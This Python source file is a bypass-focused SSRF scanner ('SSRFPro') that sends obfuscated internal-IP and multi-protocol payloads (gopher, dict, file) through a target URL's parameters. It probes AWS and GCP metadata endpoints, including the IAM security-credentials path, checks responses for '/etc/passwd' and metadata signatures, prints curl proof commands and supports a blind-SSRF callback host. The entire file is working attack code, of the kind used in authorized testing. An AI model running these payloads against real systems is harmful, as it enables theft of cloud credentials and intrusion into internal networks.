#!/usr/bin/env python3
"""
SSRFPro v1.1 - Advanced SSRF & Redirect Scanner
===============================================
Usage:
  python ssrf_pro.py -u <URL> -p <PARAM>

Description:
  Tests for SSRF using advanced IP encoding (Hex, Octal, Decimal)
  and probes for high-value Cloud Metadata endpoints.
"""
import argparse
import requests
import sys
import socket
from evasion_utils import EvasionEngine, ResultsLogger

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    CYAN = '\033[96m'
    END = '\033[0m'

class SSRFPro:
    """Industrial SSRF & Redirect Scanner (Bypass Focused)"""
    
    def __init__(self, url, method='GET', timeout=5, cookie=None, headers=None, external=None):
        self.url = url
        self.method = method
        self.timeout = timeout
        self.external = external
        self.session = requests.Session()
        self.evasion = EvasionEngine()

        # Apply authentication
        if cookie:
            self.session.headers.update({'Cookie': cookie})
        if headers:
            for header in headers:
                try:
                    key, value = header.split(':', 1)
                    self.session.headers.update({key.strip(): value.strip()})
                except ValueError:
                    pass

    def generate_ssrf_payloads(self):
        """Generates advanced SSRF bypass payloads using EvasionEngine"""
        base_ips = ["127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0", "127.1"]
        payloads = []
        
        # 1. Internal/Metadata Payloads
        for ip in base_ips:
            # Get variations from evasion engine
            obfuscated = self.evasion.advanced_ip_obfuscate(ip)
            for obs_ip in obfuscated:
                payloads.append(f"http://{obs_ip}")
                
            # Protocols
            protocols = ["http", "https", "gopher", "dict", "file"]
            for proto in protocols:
                payloads.append(f"{proto}://{ip}")

            # Specific high-value cloud targets
            if ip == "169.254.169.254":
                payloads.append("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
                payloads.append("http://metadata.google.internal/computeMetadata/v1/")
        
        # 2. External Callback (Blind SSRF)
        if self.external:
            payloads.append(f"http://{self.external}")
            payloads.append(f"https://{self.external}")
            # Add unique identifier for this specific test
            payloads.append(f"http://ssrf_test.{self.external}")

        return list(set(payloads))

    def test_ssrf(self, param_name, current_params):
        print(f"[*] {Colors.CYAN}Testing SSRF on Param{Colors.END}: {param_name}")
        
        payloads = self.generate_ssrf_payloads()
        
        for payload in payloads:
            test_params = current_params.copy()
            test_params[param_name] = payload
            
            try:
                # We often look for timing or specific error messages/redirects
                if self.method == 'GET':
                    r = self.session.get(self.url, params=test_params, timeout=self.timeout)
                else:
                    r = self.session.post(self.url, data=test_params, timeout=self.timeout)

                # SSRF Detection Logic (Reflected/In-band)
                indicators = [
                    "AMI-ID", "instance-id", "security-groups", # AWS
                    "root:x:0:0:", # If passed via gopher/file
                    "SSH-2.0-OpenSSH", # If scanning internal ports
                    "Metadata-Flavor: Google"
                ]
                
                if any(ind.lower() in r.text.lower() for ind in indicators):
                    print(f"\n{Colors.GREEN}[+] SSRF VULNERABILITY FOUND (Reflected)!{Colors.END}")
                    print(f"  Parameter: {Colors.BOLD}{param_name}{Colors.END}")
                    print(f"  Proof Payload: {Colors.YELLOW}{payload}{Colors.END}")
                    
                    # Manual Proof generation
                    proof_cmd = f"curl -i \"{self.url}?{param_name}={payload}\"" if self.method == 'GET' else \
                                f"curl -i -X POST -d \"{param_name}={payload}\" {self.url}"
                    print(f"  {Colors.CYAN}Manual Proof{Colors.END}: {proof_cmd}")
                    
                    description = f"The application is vulnerable to Server-Side Request Forgery (SSRF) via the '{param_name}' parameter. " \
                                  f"An attacker can use this to make the server perform arbitrary requests to internal or external systems, " \
                                  f"potentially accessing cloud metadata or internal services."
                    
                    ResultsLogger.log_finding("SSRFPro", "Server-Side Request Forgery", self.url, proof_cmd,
                                             vector=f"Parameter: {param_name}",
                                             description=description)
                    return True
                
                # Blind SSRF detection is harder without access to the logs of 'self.external'
                # But if we sent the request and it didn't error out, it's a good sign
                if self.external and self.external in payload:
                     print(f" {Colors.YELLOW}[*]{Colors.END} External payload sent: {payload}. {Colors.BOLD}Check your callback logs!{Colors.END}")

            except Exception:
                pass
        return False

def main():
    parser = argparse.ArgumentParser(description="SSRFPro v1.1 - Industrial SSRF Scanner")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-r", "--request", help="Raw request file (Burp-style)")
    parser.add_argument("-p", "--param", help="Target parameter")
    parser.add_argument("-e", "--encode", choices=['none', 'url', 'double', 'unicode', 'all'], default='none', help="Global Evasion Encoding")
    parser.add_argument("--cookie", help="Custom cookie")
    parser.add_argument("--header", action='append', help="Custom headers")
    parser.add_argument("-ex", "--external", help="External callback server (e.g. your.burpcollaborator.net)")
    
    args = parser.parse_args()
    
    url = args.url
    headers = {}
    data = None
    method = 'GET'
    
    if args.request:
        from evasion_utils import EvasionEngine
        print(f"[*] {Colors.CYAN}Parsing request file{Colors.END}: {args.request}")
        req = EvasionEngine.parse_request_file(args.request)
        if req:
            url, method, headers, data = req['url'], req['method'], req['headers'], req['data']
        else: sys.exit(1)
        
    if not url:
        parser.print_help()
        sys.exit(1)
    
    params_to_test = [args.param] if args.param else ["url", "dest", "redirect", "uri", "path", "continue", "file"]
    
    scanner = SSRFPro(url, cookie=args.cookie, headers=args.header, external=args.external)
    if headers: scanner.session.headers.update(headers)
    
    for p in params_to_test:
        if scanner.test_ssrf(p, {p: "test"}):
            break

if __name__ == "__main__":
    main()
